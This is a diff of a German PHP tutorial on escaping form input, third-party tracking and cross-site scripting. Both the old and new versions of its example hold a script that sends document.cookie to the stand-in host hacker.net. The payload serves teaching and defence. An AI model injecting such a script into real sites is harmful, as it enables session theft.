@@ -35,13 +35,11 @@ Kleiner-Zeichen vorkommen müssen diese für HTML escaped werden.  Hier ein
 Beispiel in MySQL:
 
 <sql>
-MariaDB [portfolio_playground]> select firstname,description from users where id=438;
-+--------------------+--------------------------------+
-| firstname          | description                    |
-+--------------------+--------------------------------+
-| Tobias "der Coder" | Mein Lieblings-Tag ist <style> |
-+--------------------+--------------------------------+
-1 row in set (0.00 sec)
+portfolio_playground=# select firstname,description from users where id=438;
+     firstname      |          description
+--------------------+--------------------------------
+ Tobias "der Coder" | Mein Lieblings-Tag ist <style>
+(1 row)
 </sql>
 
 So würde die Darstellung der Eingabefelder nicht funktionieren:
@@ -75,7 +73,7 @@ Zusammenfassend sieht die Darstellung des Eingabeformulars so aus:
 
 <php caption="Darstellung eines Eingabe-Felds des Edit-Formulars mit PHP">
 <input name="firstname" value="<?= htmlspecialchars( $person->firstname ); ?>">
-<textarea name="description" rows="7"><?php echo htmlspecialchars( $person->description ); ?></textarea>
+<textarea name="description" rows="7"><?= htmlspecialchars( $person->description ); ?></textarea>
 </php>
 
 ### Verarbeitung des POST-Request
@@ -157,15 +155,15 @@ Das Bild wird also nicht von Ihrem Webserver geladen, sondern vom Webserver von
 Herrn Lauscher. Und dort wird gleich ein php-Programm zum Erzeugen des Bildes
 aufgerufen. D.h. Herr Lauscher kann sehr bequem mit-loggen wie viele Zugriffe
 auf das Gästebuch erfolgen. Falls Herr Lauscher die Gästebuch-Besucher schon
-kennt (schon ein Cookie in Ihrem Browser gesetzt hat) kann er sie auch
-identifizieren.
+kennt  kann er die Leute auch identifizieren.
 
 Sie haben Herrn Lauscher also die Möglichkeit gegeben sehr viel über Ihre
 BesucherInne zu erfahren. So etwas ähnliches passiert z.B. wenn Sie Google
 Analytics in Ihre Webseite einbinden um Zugriffs-Statistiken zu erstellen:
 Google erfährt von jedem Zugriff auf Ihre Seite, Google kennt viele
 BesucherInnen schon (weil Sie bei gmail.com eingeloggt sind oder von einer
-vorhergehenden Suche noch ein Cookie haben.)
+vorhergehenden Suche noch ein Cookie haben.)  Oder wenn Sie den Facebook 
+"Like-Button" in ihre Seite einbinden.
 
 §
 
@@ -174,9 +172,9 @@ Im zweiten Beispiel gibt Frau Hacker neben einem Bild noch etwas Javascript ein:
 <htmlcode>
 Hallo Welt 
 
-<img src="http://hacker.net/bild.php" alt="harmloses bild" id="hack_tool" />
+<img src="http://hacker.net/bild.php" alt="harmlos" id="hack_tool" />
 <script>
-   document.getElementById("hack_tool").src += "?keks=" + document.cookie;
+document.getElementById("hack_tool").src += "?c=" + document.cookie;
 </script>
 </htmlcode>
 
@@ -207,19 +205,13 @@ erleichtern. TinyMCE verwandelt eine normale Textarea in einen wysiwyg-Editor:
 
 ![Normale Textarea (oben) kann mit TinyMCE in einen wysiwyg-Editor (unten) verwandelt werden](/images/tinymce.png)
 
-§
-
-Mit HTML5 gibt es auch die Möglichkeit ohne Textfeld, mit content-editable einen
-Editor zu erstellen. Ein Beispiel dafür ist der Aloha Editor:
-
-![Aloha Editor](/images/aloha.png)
 
 ### Behandlugn von eingegebenem HTML
 
 Für die Beispiel-Applikation wollen wir Zulassen, dass im Profil die HTML-Tags
 `<p>` und `<b>` verwendet werden können, mehr nicht. Dass es nur diese
-Tags und keine anderen sind wird bei der Eingabe und der Bearbeitung sicher
-gestellt:
+Tags und keine anderen sind wird schon bei der **Eingabe** sicher
+gestellt. Und sicherheitshalber bei der Ausgabe auch noch einmal.
 
 <php>
 $description = strip_tags( $_POST['description'], "<p><b>" );
